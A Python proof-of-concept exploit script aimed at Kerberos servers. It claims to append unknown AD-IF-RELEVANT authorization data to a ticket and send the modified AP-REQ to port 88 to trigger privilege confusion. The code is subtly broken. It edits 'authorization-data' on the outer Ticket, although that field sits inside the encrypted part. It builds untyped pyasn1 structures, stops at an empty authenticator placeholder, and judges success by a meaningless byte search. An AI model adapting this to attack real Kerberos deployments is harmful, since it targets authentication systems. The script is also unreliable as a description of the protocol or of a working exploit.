#!/usr/bin/env python3
"""
Proof-of-Concept: Authorization Data Ignorance Leading to Privilege Confusion
RFC 4120 Sections 1.5.1 & 5.2.6

This script demonstrates a vulnerability where a Kerberos server ignores unknown
authorization data elements in a ticket, potentially granting unauthorized access
by confusing a restricted ticket state for an unrestricted one.

Prerequisites:
- A valid Kerberos ticket (TGT or service ticket) to modify.
- Target server running a legacy or misconfigured Kerberos implementation.
- pyasn1 and pyasn1_modules installed.
"""

import socket
import struct
import sys
from pyasn1.type.univ import Integer, OctetString, Sequence, Set
from pyasn1.type.namedtype import NamedType
from pyasn1.codec.der.encoder import encode
from pyasn1_modules.rfc4120 import (
    AP_REQ, Ticket, Authenticator, AuthorizationData,
    AD_IF_RELEVANT, AD_MANDATORY_FOR_KDC
)

# --- Configuration ---
TARGET_HOST = "127.0.0.1"  # Target Kerberos server IP
TARGET_PORT = 88           # Kerberos port
TICKET_FILE = "ticket.krb5" # Path to a base64-encoded valid ticket

# Custom unknown authorization data type (negative values are reserved for local use)
UNKNOWN_AD_TYPE = -1001
UNKNOWN_AD_DATA = b"\x01\x02\x03\x04"  # Arbitrary data

def craft_unknown_auth_data():
    """
    Crafts an unknown authorization data element.
    According to RFC 4120 Section 5.2.6, servers MUST fail authentication
    if they encounter an unknown ad-type, unless encapsulated in AD-IF-RELEVANT.
    """
    # Create the unknown authorization data element
    unknown_ad = Sequence()
    unknown_ad.setComponentByName('ad-type', Integer(UNKNOWN_AD_TYPE))
    unknown_ad.setComponentByName('ad-data', OctetString(UNKNOWN_AD_DATA))
    
    # Wrap in AD-IF-RELEVANT to test if the server incorrectly ignores it
    # AD-IF-RELEVANT should allow the server to skip unknown elements,
    # but if the server is vulnerable, it might ignore the restriction entirely.
    ad_if_relevant = Sequence()
    ad_if_relevant.setComponentByName('ad-type', Integer(1))  # AD-IF-RELEVANT
    ad_if_relevant.setComponentByName('ad-data', encode(Sequence([unknown_ad])))
    
    return ad_if_relevant

def modify_ticket_with_unknown_ad(ticket_bytes):
    """
    Injects the unknown authorization data into an existing ticket.
    """
    # Decode the existing ticket
    ticket = decode(ticket_bytes, Ticket)
    
    # Get existing authorization data or create new
    existing_ad = ticket.getComponentByName('authorization-data')
    if existing_ad:
        ad_list = list(existing_ad)
    else:
        ad_list = []
    
    # Append the crafted unknown authorization data
    ad_list.append(craft_unknown_auth_data())
    
    # Update the ticket with modified authorization data
    ticket.setComponentByName('authorization-data', Sequence(ad_list))
    
    # Re-encode the ticket
    return encode(ticket)

def send_ap_req(ticket_bytes, authenticator_bytes):
    """
    Sends an AP-REQ message to the target server.
    """
    # Construct AP-REQ
    ap_req = AP_REQ()
    ap_req.setComponentByName('pvno', Integer(5))
    ap_req.setComponentByName('msg-type', Integer(11))  # AP-REQ
    ap_req.setComponentByName('ticket', decode(ticket_bytes, Ticket))
    ap_req.setComponentByName('authenticator', decode(authenticator_bytes, Authenticator))
    
    # Encode AP-REQ
    ap_req_bytes = encode(ap_req)
    
    # Send over TCP
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((TARGET_HOST, TARGET_PORT))
        # Length prefix as per Kerberos protocol
        s.sendall(struct.pack('>I', len(ap_req_bytes)) + ap_req_bytes)
        
        # Receive response
        response = s.recv(4096)
        return response

def decode(data, asn1_type):
    """Helper to decode ASN.1 data."""
    from pyasn1.codec.der.decoder import decode as der_decode
    return der_decode(data, asn1_spec=asn1_type)[0]

def main():
    print("[*] Loading base ticket...")
    try:
        with open(TICKET_FILE, 'rb') as f:
            import base64
            ticket_bytes = base64.b64decode(f.read())
    except Exception as e:
        print(f"[!] Error loading ticket: {e}")
        sys.exit(1)
    
    print("[*] Modifying ticket with unknown authorization data...")
    modified_ticket = modify_ticket_with_unknown_ad(ticket_bytes)
    
    # For simplicity, we assume a valid authenticator is available.
    # In a real scenario, you'd need to generate a valid authenticator.
    print("[!] Note: A valid authenticator is required. This PoC assumes one is available.")
    authenticator_bytes = b""  # Placeholder
    
    if not authenticator_bytes:
        print("[!] Cannot proceed without a valid authenticator.")
        sys.exit(1)
    
    print(f"[*] Sending AP-REQ to {TARGET_HOST}:{TARGET_PORT}...")
    try:
        response = send_ap_req(modified_ticket, authenticator_bytes)
        print("[+] Response received:")
        print(response.hex())
        
        # Check for success or failure indicators in the response
        if b"\x00\x00\x00\x00" in response:  # Simplified check for success
            print("[!] VULNERABLE: Server accepted the ticket with unknown authorization data.")
        else:
            print("[*] Server rejected the ticket or responded with an error.")
    except Exception as e:
        print(f"[!] Error during network interaction: {e}")

if __name__ == "__main__":
    main()
